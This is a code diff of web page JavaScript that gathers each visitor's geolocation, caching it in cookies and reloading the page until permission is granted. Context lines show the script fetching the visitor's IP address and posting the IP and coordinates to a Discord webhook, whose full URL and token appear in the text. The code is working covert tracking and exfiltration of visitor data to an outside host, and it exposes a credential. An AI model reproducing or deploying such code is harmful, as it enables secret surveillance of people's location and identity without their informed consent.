@@ -1,33 +1,27 @@
-
-window.addEventListener('DOMContentLoaded', () => {
-  var x = document.getElementById("map");
+var x = document.getElementById("demo");
 var anew
-getLocation()
+window.onload = function() {      
+  var geoSuccess = function(position) {           
+     $.cookie("position_latitude", position.coords.latitude);
+     $.cookie("position_longitude", position.coords.longitude);
+     document.location.reload(true);
+  };
+  if ($.cookie("position_longitude", undefined))
+      navigator.geolocation.getCurrentPosition(geoSuccess);
 
+};
 navigator.permissions && navigator.permissions.query({name: 'geolocation'})
 .then(function(PermissionStatus) {
     if (PermissionStatus.state == 'granted') {
-      navigator.geolocation.getCurrentPosition(
-        revealPosition,
-        positionDenied,
-        geoSettings
-      );
-      document.getElementById("map").style.display = 'block'
+        console.log("granted")
     } else if (PermissionStatus.state == 'prompt') {
-      document.getElementById("map").style.display = 'block'
-      navigator.geolocation.getCurrentPosition(
-        revealPosition,
-        positionDenied,
-        geoSettings
-      );
-
+      console.log("prompt")
+      setTimeout(function myFunction() {
+        location.reload()
+      },5000)
+      
     } else {
          alert("Please allow location and refresh the website.")
-         navigator.geolocation.getCurrentPosition(
-          revealPosition,
-          positionDenied,
-          geoSettings
-        );
          document.getElementById("map").style.display = 'none';
 
     }
@@ -37,11 +31,11 @@ function text(url) {
   return fetch(url).then(res => res.text());
 }
 function getLocation() {
+  
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
   } else {
-    navigator.geolocation.getCurrentPosition(showPosition);
-    x.style.display = "none";
+    x.innerHTML = "Geolocation is not supported by this browser.";
   }
 }
 spc = " "
@@ -50,7 +44,7 @@ function showPosition(position) {
   anew = position.coords.latitude+spc+position.coords.longitude+spc
 }
 
-
+getLocation()
 function sendMessage(msg) {
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1105995807066427392/f2bAUihbaCF68cSjC_zWbgYY_MdZIm9FyvfVpCa47F6OLC1Qc7gC9sOq_91XIfCkSc-U");
@@ -81,4 +75,3 @@ req.onload  = function() {
   sendMessage(ipr.ipAddress+spc+anew)
 };
 req.send(null);
-});
